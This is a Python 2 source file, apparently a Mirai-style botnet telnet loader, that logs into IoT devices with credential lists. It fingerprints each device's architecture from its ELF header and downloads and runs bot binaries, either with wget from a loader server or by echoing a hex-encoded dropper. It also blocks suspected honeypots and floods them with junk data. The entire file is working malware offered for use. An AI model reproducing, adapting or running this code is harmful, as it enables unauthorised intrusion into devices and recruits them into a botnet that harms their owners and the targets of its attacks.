#!/usr/bin/python2
#Phaaaat hax telnet loader by Freak
#this loader actively detects honeypots using incorrect user agents when requesting bins.
#this tel
#it will actively block any detected honeypot with iptables.
#UPDATED FOR May 2022, FASTEST TELNET LOADER EVER!!!! FASTER THAN MIRAI SKIDS
#SELFREP MODE (recommended) configure capsaicin for scanlisten port
#ncat -kvlp scanlistenport | python loader.py - 200

import sys, re, os, socket, time, select, random
from threading import Thread
from struct import pack,unpack
from ctypes import *
global serverip
global binprefix
global binname
global nameprefix
serverip = "127.0.0.1"
nameprefix = "botnet."
binprefix = "/f/" + nameprefix
binname = binprefix.split("/")[-1]
global fh
fh = open("bots.txt","a+")

def chunkify(lst,n):
    return [ lst[i::n] for i in xrange(n) ]
global running
running = 0

global echo
global tftp
global wget
global logins
global echoed
global ran
echoed = []
tftp = 0
wget = 0
echo = 0
logins = 0
ran = 0
def printStatus():
    global echo
    global tftp
    global wget
    global logins
    global ran
    while 1:
        time.sleep(5)
        print ("\033[32m[\033[31m+\033[32m] Logins: " + str(logins) + "     Ran:" + str(ran) + "  Echoes:" + str(echo) + " Wgets:" + str(wget) + " TFTPs:" + str(tftp) + "\033[37m")

def readUntil(tn, advances, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        for advance in advances:
            if advance in buf: return buf
    return ""

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

def contains(data, array):
    for test in array:
        if test in data:
            return True
    return False

def split_bytes(s, n):
    assert n >= 4
    start = 0
    lens = len(s)
    while start < lens:
        if lens - start <= n:
            yield s[start:]
            return # StopIteration
        end = start + n
        assert end > start
        yield s[start:end]
        start = end



class FileWrapper():
    def __init__(self, f):
        self.f = f

    # blindly read n bytes from the front of the file
    def read(self, n):
        result = self.f.read(n)
        return result

    # read n bytes from the next alignment of k from start
    def read_align(self, n, k=None, start=0):
        # if no alignment specified, assume aligned to n
        if not k:
            k = n
        remainder = self.f.tell() % k
        num_pad = (k-remainder) % k
        pad = self.read(num_pad)
        result = self.read(n)
        return result

    # unpack the data using the endian
    def read_uint(self, n, endian):
        result = self.read_align(n)
        unpk_byte = ""
        if endian == 1:
            unpk_byte = "<"
        elif endian == 2:
            unpk_byte = ">"
        else:
            unpk_byte = "@"
        format_ = unpk_byte+"B"*n
        return unpack(format_, result)

    def seek(self, offset):
        self.f.seek(offset)

    def tell(self):
        return self.f.tell()
   
class ElfHeader():
    def __init__(self, e_ident):
        f=open(".tempelf", "wb")
        f.write(e_ident)
        f.close()
        f=open(".tempelf", "rb")
        self.f = FileWrapper(f)
        self.e_ident = self.f.read(16)     #unsigned char
        assert(self.e_ident[0:4] == "\x7fELF")
        EI_CLASS = ord(self.e_ident[4])
        # 1 means little endian, 2 means big endian
        EI_DATA = ord(self.e_ident[5])
        if EI_DATA == 1:
            self.endian = 1
        elif EI_DATA == 2:
            self.endian = 2
        else:
            assert(False)
        # this should be 1
        EI_VERSION = ord(self.e_ident[6])
        assert(EI_VERSION == 1)
        # see the tables at http://www.sco.com/developers/gabi/latest/ch4.eheader.html
        EI_OSABI = self.e_ident[7]
        EI_ABIVERSIO = self.e_ident[8]
        self.e_type = None      #Elf32_Half
        self.e_machine = None       #Elf32_Half
        self.e_version = None       #Elf32_Word
        self.e_entry = None     #Elf32_Addr
        self.e_phoff = None     #Elf32_Off
        self.e_shoff = None     #Elf32_Off
        self.e_flags = None     #Elf32_Word
        self.e_ehsize = None        #Elf32_Half
        self.e_phentsize = None     #Elf32_Half
        self.e_phnum = None     #Elf32_Half
        self.e_shentsize = None     #Elf32_Half
        self.e_shnum = None     #Elf32_Half
        self.e_shstrndx = None      #Elf32_Half

    def parse_header(self):

        #Magic number
        assert(self.e_ident[0:4] == "\x7fELF")
        # 1 means 32, 2 means 64
        EI_CLASS = ord(self.e_ident[4])
        #TODO: Are these the right sizes to put here?
      
        # 1 means little endian, 2 means big endian
        EI_DATA = ord(self.e_ident[5])
        self.bytes = EI_CLASS
        # this should be 1
        EI_VERSION = ord(self.e_ident[6])
        # see the tables at http://www.sco.com/developers/gabi/latest/ch4.eheader.html
        EI_OSABI = self.e_ident[7]
        EI_ABIVERSIO = self.e_ident[8]

        #Parse the rest of the header
        self.e_type = self.Half(self.f)
        self.e_machine = self.Half(self.f)

        section = {}
        section["e_machine"] = self.e_machine
        section["endian"] = self.endian
        return section

    def Half(self, f):
        return self.f.read_uint(2, self.endian)


honeycheck = 0
global badips
badips=[]
def fileread():
    fh=open("honeypots.txt", "rb")
    data=fh.read()
    fh.close()
    return data
def clientHandler(c, addr):
    global badips
    try:
        if addr[0] not in badips and addr[0] not in fileread():
            print (addr[0] + ":" + str(addr[1]) + " has connected!")
            request = recvTimeout(c, 8912)
            if "curl" not in request and "Wget" not in request:
                if addr[0] not in fileread():
                    fh=open("honeypots.txt", "a")
                    fh.write(addr[0]+"\n")
                    fh.close()
                    os.popen("iptables -A INPUT -s " + addr[0] + " -j DROP")
                badips.append(addr[0])
                print (addr[0] + ":" + str(addr[1]) + " is a fucking honeypot!!!")
                c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
                for i in range(10):
                    c.send(os.urandom(65535*2))
        else:
            c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
            for i in range(10):
                c.send(os.urandom(65535*2))
        c.close()
    except Exception as e:
        #print str(e)
        pass

def honeyserver(honeyport):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', honeyport))
    s.listen(999999999)
    while 1:
        try:
            c, addr = s.accept()
            Thread(target=clientHandler, args=(c, addr,)).start()
        except:
            pass
if honeycheck==1:
    Thread(target=honeyserver, args=(8080,)).start()

def infect(ip, port, username, password):
    global running

    global echo
    global tftp
    global wget
    global logins
    global echoed
    if ip in echoed:
        return
    infectedkey = "PERROR"
    try:
        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tn.settimeout(0.37)
        tn.connect((ip, port))
    except:
        try:
            tn.close()
        except:
            pass
        return
    try:
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(username + "\r\n")
            time.sleep(0.1)
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(password + "\r\n")
            time.sleep(0.8)
        else:
            pass
        prompt = ''
        prompt += recvTimeout(tn, 8192)
        if ">" in prompt and "ONT" not in prompt:
            success = True
        elif "#" in prompt or "$" in prompt or "@" in prompt or ">" in prompt:
            if "#" in prompt:
                prompt = "#"
            elif "$" in prompt:
                prompt = "$"
            elif ">" in prompt:
                prompt = ">"
            success = True
        else:
            tn.close()
            return
    except:
        tn.close()
        return
    if success == True:
        try:
            tn.send("enable\r\n")
            tn.send("system\r\n")
            tn.send("shell\r\n")
            tn.send("sh\r\n")
            tn.send("echo -e '\\x41\\x4b\\x34\\x37'\r\n")
        except:
            tn.close()
            return
#        time.sleep(1)
        try:
            buf = recvTimeout(tn, 8192)
        except:
            tn.close()
            return
        if "AK47" in buf:
            if honeycheck == 1:
                tn.send("wget http://" +serverip + ":" + str(8080) + "/bins/mirai.arm &\r\n");
                tn.send("curl http://" +serverip + ":" + str(8080) + "/bins/mirai.arm &\r\n");
                time.sleep(3)
                recvTimeout(tn, 8192)
                if ip in badips:
                    running -= 1
                    return
            tn.send("cd /tmp ; cd /home/$USER ; cd /var/run ; cd /mnt ; cd /root ; cd /\r\n")
            tn.send("cat /proc/mounts;busybox cat /proc/mounts\r\n")
            mounts = recvTimeout(tn, 1024*1024)
            for line in mounts.split("\n"):
                try:
                    path = line.split(" ")[1]
                    if " rw" in line:
                        tn.send("echo -e '%s' > %s/.keksec; cat %s/.keksec;busybox cat %s/.keksec; rm %s/.keksec;busybox rm %s/.keksec\r\n" % ("\\x41\\x4b\\x34\\x37", path, "\\x41\\x4b\\x34\\x37", path, path, path, path, path))
                        if "AK47" in recvTimeout(tn, 1024*1024):
                            tn.send("cd %s\r\n" % path) #cd into the writeable directory
                except:
                    continue
            try:
                data=""
                tn.send("echo -en \"START\"\r\n")
                c = 0
                while 1:
                    data+=recvTimeout(tn, 100)
                    if data=="":
                        running -= 1
                        try:
                            tn.close()
                        except:
                            pass
                        return
                    if "START" in data:
                        break

                tn.send("PS1= ; cat /bin/echo ; busybox cat /bin/echo\r\n")
                data=""
                data+=recvTimeout(tn, 0xff00)
                st=0
                while st<len(data):
                    if data[st] == "\x7f":
                        data=data[st:(len(data) % 0xff00)]
                        continue
                    else:
                        st+=1
                elfheader=data[data.find("ELF")-1:(len(data) % 0xff00)]
                if elfheader[0:4]!="\x7fELF":
                    running -= 1
                    try:
                        tn.close()
                    except:
                        pass
                    return
            except:
                running -= 1
                try:
                    tn.close()
                except:
                    pass
                return
            try:
                header = ElfHeader(elfheader).parse_header()
                EM_NONE = 0
                EM_M32 = 1
                EM_SPARC = 2
                EM_386 = 3
                EM_68K = 4 #// m68k
                EM_88K = 5 #// m68k
                EM_486 = 6 #// x86
                EM_860 = 7 #// Unknown
                EM_MIPS = 8 #/* MIPS R3000 (officially, big-endian only) */
                #/* Next two are historical and binaries and modules of these types will be rejected by Linux. */
                EM_MIPS_RS3_LE = 10 #/* MIPS R3000 little-endian */
                EM_MIPS_RS4_BE = 10 #/* MIPS R4000 big-endian */
                EM_PARISC = 15 #/* HPPA */
                EM_SPARC32PLUS = 18 #/* Sun's "v8plus" */
                EM_PPC = 20 #/* PowerPC */
                EM_PPC64 = 21 #/* PowerPC64 */
                EM_SPU = 23 #/* Cell BE SPU */
                EM_ARM = 40 #/* ARM 32 bit */
                EM_SH = 42 #/* SuperH */
                EM_SPARCV9 = 43 #/* SPARC v9 64-bit */
                EM_H8_300 = 46 #/* Renesas H8/300 */
                EM_IA_64 = 50 #/* HP/Intel IA-64 */
                EM_X86_64 = 62 #/* AMD x86-64 */
                EM_S390 = 22 #/* IBM S/390 */
                EM_CRIS = 76 #/* Axis Communications 32-bit embedded processor */
                EM_M32R = 88 #/* Renesas M32R */
                EM_MN10300 = 89 #/* Panasonic/MEI MN10300, AM33 */
                EM_OPENRISC = 92 #/* OpenRISC 32-bit embedded processor */
                EM_BLACKFIN = 106 #/* ADI Blackfin Processor */
                EM_ALTERA_NIOS2 = 113 #/* Altera Nios II soft-core processor */
                EM_TI_C6000 = 140 #/* TI C6X DSPs */
                EM_AARCH64 = 183 #/* ARM 64 bit */
                EM_TILEPRO = 188 #/* Tilera TILEPro */
                EM_MICROBLAZE = 189 #/* Xilinx MicroBlaze */
                EM_TILEGX = 191 #/* Tilera TILE-Gx */
                EM_FRV = 0x5441 #/* Fujitsu FR-V */
                EM_AVR32 = 0x18ad #/* Atmel AVR32 */
                if (header["e_machine"][0] == EM_ARM or header["e_machine"][0] == EM_AARCH64):
                    arch = "arm"
                elif (header["e_machine"][0] == EM_MIPS or header["e_machine"][0] == EM_MIPS_RS3_LE):
                    if (header["endian"] == 1):
                        arch = "mpsl"
                    else:
                        arch = "mips"
                elif (header["e_machine"][0] == EM_386 or header["e_machine"][0] == EM_486 or header["e_machine"][0] == EM_860 or header["e_machine"][0] == EM_X86_64):
                    arch = "x86"
                elif (header["e_machine"][0] == EM_SPARC or header["e_machine"][0] == EM_SPARC32PLUS or header["e_machine"][0] == EM_SPARCV9):
                    arch = "spc"
                elif (header["e_machine"][0] == EM_68K or header["e_machine"][0] == EM_88K):
                    arch = "m68k"
                elif (header["e_machine"][0] == EM_PPC or header["e_machine"][0] == EM_PPC64):
                    arch = "ppc"
                elif (header["e_machine"][0] == EM_SH):
                    arch = "sh4"
                try:
                    arch
                except NameError:
                    try:
                        tn.close()
                    except:
                        pass
                    running -= 1
                    return
            except:
                pass
            print ("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip, arch))
            logins += 1
            fh.write(ip + ":" + str(port) + " " + username + ":" + password + "\n")
            fh.flush()
            rekdevice = "cd /tmp or cd $(find / -writable | head -n 1);\r\nwget http://" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; busybox wget http://""" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; chmod 777 """ + binname  + arch + """; ./""" + binname  + arch + """; rm -f """ + binname  + arch
            rekdevice = rekdevice.replace("\r", "").split("\n")
            for rek in rekdevice:
                tn.send(rek + "\r\n")
                time.sleep(1.5)
                buf = recvTimeout(tn, 1024*1024)
                loaded = False
                if "bytes" in buf:
                    print ("\033[32m[\033[31m+\033[32m] \033[33mwget \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    tftp += 1
                    loaded = True
                elif "saved" in buf:
                    print ("\033[32m[\033[31m+\033[32m] \033[33mWGET \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    wget += 1
                    loaded = True
                if infectedkey in buf:
                    ran += 1
                    print ("\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    f=open("infected.txt", "a")
                    f.write(ip +":" + str(port) + " " + username + ":" + password + "\r\n")
                    f.close()
                first = True
                count = 0
                hexdata = []
                for chunk in split_bytes(open("bins/dlr." + arch, "rb").read(), 128):
                    hexdata.append(''.join(map(lambda c:'\\x%02x'%c, map(ord, chunk))))
                parts = len(hexdata)
                for hexchunk in hexdata:
                    seq = ">" if first else ">>"
                    tn.send("echo -ne \"" + hexchunk + "\" " + seq + " updDl\r\n") #;busybox echo -ne '" + hexchunk + "' " + seq + " .updDl\r\n")
                    first = False
                    count += 1
                    time.sleep(0.01)
                print ("\033[32m[\033[31m+\033[32m] \033[33mECHO \033[31m---> \033[32m" + ip + " \033[31m---> \033[36m(" + str(count) + "/" + str(parts) + ") " + arch + "\033[37m")
                tn.send("chmod 777 updDl;busybox chmod 777 updDl\r\n")
                tn.send("./updDl\r\n")
                time.sleep(1.7)
                tn.send("./enemy")
                tn.send("rm -rf ./updDl\r\n")
                time.sleep(0.1)
                buf = recvTimeout(tn, 1024*1024)
                if "FIN" in buf:
                    echo += 1
                    print ("\033[32m[\033[31m+\033[32m] \033[33mECHOLOADED \033[31m---> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[31m ---> \033[35m%s\033[37m" %(username, password, ip, binary))
                    tn.close()
                    f=open("echoes.txt","a")
                    f.write(ip +":23 " + username + ":" + password + "\r\n")
                    f.close()
                    echoed.append(ip)
                if infectedkey in buf:
                    ran += 1
                    f=open("infected.txt", "a")
                    f.write(ip +":23 " + username + ":" + password + "\r\n")
                    f.close()
                    print ("\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    tn.close()
       
    else:
        try:
            tn.close()
        except:
            pass
    running -= 1
    return

def check(chunk, fh):
    global running
    running += 1
    threadID = running
    for login in chunk:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.37)
            if ":23 " in login:
                port = 23
                try:
                    ip = login.split(":")[0]
                    combo = login.split(":23 ")[1]
                    username = combo.split(":")[0]
                    password = combo.split(":")[1]
                except:
                    pass
            elif ":2323 " in login:
                port = 2323
                try:
                    ip = login.split(":")[0]
                    combo = login.split(":2323 ")[1]
                    username = combo.split(":")[0]
                    password = combo.split(":")[1]
                except:
                    pass
            s.connect((ip, port))
            s.close()
            infect(ip, port, username, password)
        except:
            pass
    running -= 1
if sys.argv[1] == "-":
    try:
        while running >= 512:
            time.sleep(0.01)
        Thread(target = check, args = ([raw_input()], fh,)).start()
    except KeyboardInterrupt:
        os.kill(os.getpid(), 9)
    except Exception as e:
        print (str(e))
        pass
else:
    threads = int(sys.argv[2])
    lines = open(sys.argv[1],"rb").readlines()
    lines = map(lambda x: x.strip(), lines) # remove all newlines
    random.shuffle(lines)
    chunks = chunkify(lines, threads) # make seperate chunk for each thread
    Thread(target=printStatus).start()
    for chunk in chunks:
        try:
            while running >= 512:
                time.sleep(0.01)
            Thread(target = check, args = (chunk, fh,)).start()
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception as e:
            print (str(e))
            pass
